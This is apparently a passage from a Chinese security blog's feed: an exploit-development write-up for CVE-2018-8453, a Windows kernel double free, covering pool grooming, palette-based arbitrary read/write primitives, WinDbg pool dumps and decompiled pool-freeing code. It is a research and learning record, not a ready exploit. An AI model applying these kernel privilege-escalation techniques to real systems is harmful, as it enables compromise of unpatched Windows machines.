&lt;p&gt;从刚开始想了解内核漏洞去读《Kernel Attacks through User-Mode Callbacks》到现在完整分析完一个漏洞，已经过去了半年时间。这样的速度是快还是慢呢？类似的疑问我常常会想，但我又知道这样的问题是无所谓回答不回答的。曾经刚入门安全的时候我曾在笔记中留下这样的话，现在回过头看还是会不禁赞叹一下自己，哈哈。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;有点忙，能学东西的时间不多，有点苦恼于自己什么都不会，但是转念一想才开始学习3个月不到，这也正常。我已经见过不少的例子，只要保持学习，就可以从什么都不会到小有所成&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">上一篇文章中我们在探索漏洞利用的过程中意外发现了一个新的方法，即一个任意地址减一的原语，本文将延续这个方法，通过任意地址减一这个原语实现漏洞的利用。</summary></entry><entry><title type="html">CVE-2018-8453 利用（上）</title><link href="https://citrusice.github.io/posts/cve-2018-8453-exploit-1/" rel="alternate" type="text/html" title="CVE-2018-8453 利用（上）" /><published>2022-12-27T13:11:32+08:00</published><updated>2022-12-27T13:11:32+08:00</updated><id>https://citrusice.github.io/posts/cve-2018-8453-exploit-1</id><content type="html" xml:base="https://citrusice.github.io/posts/cve-2018-8453-exploit-1/">&lt;p&gt;在有了一些漏洞利用知识后，回过头来再看这个洞。在这个洞中，攻击者可以通过在 HMAssignmentUnlock 中提前释放 SBTrack 来达到 double free 的效果，那么如何利用这个漏洞呢？&lt;/p&gt;

&lt;p&gt;回顾之前的漏洞利用知识，我们至少需要有改变内存内容的能力，这样才能通过 gdi 对象来构成一个任意写原语（bitmap extend abuse），但是如何通过这样的 bug 来影响内存的内容？&lt;/p&gt;

&lt;p&gt;本文的利用的目标环境为 win10 x64 1703&lt;/p&gt;

&lt;h1 id=&quot;double-free-转-uaf&quot;&gt;double free 转 uaf&lt;/h1&gt;

&lt;p&gt;思路来源于 &lt;a href=&quot;https://paper.seebug.org/798/&quot;&gt;[下篇]从补丁 diff 到 EXP–CVE-2018-8453 漏洞分析与利用&lt;/a&gt;，原文中作者的利用环境为 x86，本文将模仿原作者的思路在 x64 下尝试编写 exp。&lt;/p&gt;

&lt;p&gt;在 1703 中，微软对 bitmap 开启了 type isolation，因此我们使用 palette 来构造任意读写原语。&lt;/p&gt;

&lt;p&gt;在 sbtrack 第一次被释放后，如果我们可以在 sbtrack 的位置分配到一个 palette，那么这个 palette 会在 sbtack 第二次被释放的时候被释放掉，这时我们就有了一个可以读写一块未分配 chunk 的原语。那么如果能在这个未分配 chunk 的末尾部分再次分配一个 palette 对象，这时我们的这个原语就可以控制新 palette 对象头部的 ppalColor，通过改写该指针，我们就可以获得一个完整任意内存读写的原语。&lt;/p&gt;

&lt;p&gt;但是现实没有这么美好，首先要解决的是结构体大小问题。sbtrack 的大小为 0x68，而 palette 大小是动态分配的，大小为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4 * cColors + 0x90&lt;/code&gt; ，根本放不到 sbtrack 的内存里面。关于这一点，可以通过 pool chunk 合并的机制，当 sbtrack 释放后，紧接着释放 sbtrack 后面的 chunk，这时 windows 会将这两块 chunk 合并为一块，这样我们就可以构造出一个可以容纳 palette 对象的块。因此需要保证在紧邻着 sbtrack 之后有一个我们能控制的 chunk（并且足够大），这样在 sbtrack 第一次被释放后，我们可以释放该块，让前后块合并。&lt;/p&gt;

&lt;p&gt;如果我们只是随便创建了一个 sbtrack，那么这个 sbtrack 可能会使用 freelist 中的 chunk，因此我们首先要消耗完 freelist 中的内存。&lt;/p&gt;

&lt;p&gt;当 freelist 用尽后，如果再有分配请求，windows 则会分配新的页面。值得注意的是，当新页面分配后，第一个对象会放在这个页的头部，而第二个对象则会放在这个页的尾部，并且之后的对象分配也是从尾部向低地址增长。所以在 freelist 用尽后，我们先分配一个 chunk，这时候系统会调拨一个新页，之后再分配第二个 chunk，第二个 chunk 会放在新页的尾部，第一个 chunk 与第二个 chunk 之间的空间我们留给 sbtrack：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+------------------------+            +------------------------+    
|                        |            |                        |    
|                        |            |                        |    
|      allocated         |            |      allocated         |    
|                        |            |                        |    
|                        |            |                        |    
|------------------------|   -free-&amp;gt;  |------------------------|    
|     sbtrack            |            |                        |    
|------------------------|            |                        |    
|                        |            |         free           |    
|     allocated          |            |                        |    
|                        |            |                        |    
+------------------------+            +------------------------+    

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;sbtrack 第一次释放后，释放 sbtrack 之后挨着的 chunk，使两个 chunk 合并，之后在 free 的这个位置申请一个 palette 对象&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  +------------------------+         +------------------------+      
  |                        |         |                        |      
  |                        |         |                        |      
  |      allocated         |         |      allocated         |      
  |                        |         |                        |      
  |                        |         |                        |      
  |------------------------|  free-&amp;gt; |------------------------|      
  |                        |         |                        |      
  |                        |         |                        |      
  |      palette           |         |         free           |      
  |                        |         |                        |      
  |                        |         |                        |      
  +------------------------+         +------------------------+      
                                                                     

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;之后由于 doublefree 漏洞，该 palette 会被再次释放，此时我们的 palette 就会指向一块悬空的内存，至此我们就有了一个读写一块内存的原语。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; +------------------------+                     
 |                        |                     
 |                        |                     
 |      allocated         |                     
 |                        |                     
 |                        |                     
 |------------------------|                     
 |------------------------|                    
 |       palette*n        |&amp;lt;- overwrite header  
 |------------------------|                     
 |       palette          |                     
 |                        |                     
 +------------------------+                     

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;之后在这块悬空的内存上分配许多小 palette，再通过刚刚的原语操作小 palette 的头部，使其可以越界读写，通过 bitmap extend abuse 类似的手法最终可以获得一个任意内存读写的原语。&lt;/p&gt;

&lt;h1 id=&quot;hotcold-page-defer-free&quot;&gt;Hot/Cold Page? Defer Free!&lt;/h1&gt;

&lt;p&gt;思路是这么个思路，接下来来实操一下：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;为了让 sbtrack 能被分配一页的中间位置，我们需要计算出 sbtrack 所占用的内存大小 `(0x68+0x1f)&amp;amp;~(0xf)`，也就是 0x80。为了能让内核为我们分配新页，而不使用 freelist 中的 chunk，我们先需要大量分配 chunk，用光 freelist。新分配的每页布局要保证 `chunk1+chunk2+0x80==0x1000`，这里我让 chunk1 为 0x810, chunk2 为 0x770
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; !pool @rax
Pool page fffff5b644c33820 region is Paged session pool
 fffff5b644c33000 size:  810 previous size:    0  (Allocated)  Usac Process: ffffb8092dc5e080
*fffff5b644c33810 size:   80 previous size:  810  (Allocated) *Usst Process: ffffb8092dc5e080
		Owning component : Unknown (update pooltag.txt)
 fffff5b644c33890 size:  770 previous size:   80  (Allocated)  Usac Process: ffffb8092dc5e080
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后释放的时候就出问题了，发现两个释放的 chunk 并没有合成为一个大 chunk&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; !pool fffff5b644c33000
Pool page fffff5b644a398a0 region is Paged session pool
 fffff5b644c33000 size:  810 previous size:    0  (Allocated)  Usac Process: ffffb8092dc5e080
 fffff5b644c33810 size:   80 previous size:  810  (Free )  Usst
*fffff5b644c33890 size:  770 previous size:   80  (Free ) *Usac
		Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一反应是开了 defer free，看一下 ExpPoolFlags，根据 xp 代码中的定义，如果开启 defer free 则 0x200 的位为 1&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; ?dwo(nt!ExpPoolFlags)
Evaluate expression: 256 = 00000000`00000100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;未开启&lt;/p&gt;

&lt;p&gt;没办法，只能去逆一下 ExFreePoolWithTag 的流程，找到合并 chunk 的逻辑，根据 trace 结果对比发现&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExpPoolFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 0x100 EX_SEPARATE_HOT_PAGES_DURING_BOOT&lt;/span&gt;
                                                &lt;span class=&quot;c1&quot;&gt;// 如果未开启  hot/cold page separation&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;_InterlockedIncrement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v35&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;_InterlockedExchangeAdd64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v35&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x98&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool_size3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v74&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_FAST_MUTEX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v35&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CheckType2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ExAcquireFastMutex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;PsBoostThreadIo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeGetCurrentThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;KeAcquireInStackQueuedSpinLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PKSPIN_LOCK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LockHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;c1&quot;&gt;//merge next chunk&lt;/span&gt;
          &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
          &lt;span class=&quot;c1&quot;&gt;//merge previous chunk&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pending_freedepth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool_desc3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PendingFreeDepth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pending_freedepth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pending_freedepth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;bMultiThreaded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool_desc3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ThreadsProcessingDeferrals&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_65&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;bMultiThreaded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;ExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool_desc3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bMultiThreaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LABEL_65&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pool_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProcessBilled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExpPoolQuotaCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_m_prefetchw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool_desc3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PendingFrees&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pending_free_next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool_desc3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PendingFrees&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pending_free_next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v45&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pending_free_next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;pending_free_next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_InterlockedCompareExchange64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool_desc3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PendingFrees&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                &lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                &lt;span class=&quot;n&quot;&gt;pending_free_next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pending_free_next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v45&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_InterlockedIncrement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool_desc3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PendingFreeDepth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当 ExpPoolFlags 0x100 位置 1 时，内核是不会直接合并相邻的 chunk 的，这个在代码中为 EX_SEPARATE_HOT_PAGES_DURING_BOOT ，也就是指 hot/cold page separation 这个机制。&lt;/p&gt;

&lt;p&gt;Kernel Pool Exploitation on Windows 7 中有提到过这个机制&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The flag is set during system boot-up to increase speed and reduce memory footprint. A timer (set in  nt! ExpBootFinishedTimer) turns off hot/cold page separation 2 minutes after boot.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;xp 代码中也有体现&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;cp&quot;&gt;#if defined (NT_UP)
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MmNumberOfPhysicalPages&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;LARGE_INTEGER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TwoMinutes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Set the flag to disable lookasides and use hot/cold page&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// separation during bootup.&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;ExSetPoolFlags&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EX_SEPARATE_HOT_PAGES_DURING_BOOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Start a timer so the above behavior is disabled once bootup&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// has finished.&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;KeInitializeTimer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExpBootFinishedTimer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;KeInitializeDpc&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExpBootFinishedTimerDpc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                             &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PKDEFERRED_ROUTINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExpBootFinishedDispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                             &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;TwoMinutes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QuadPart&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int32x32To64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;KeSetTimer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExpBootFinishedTimer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;TwoMinutes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExpBootFinishedTimerDpc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;        
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

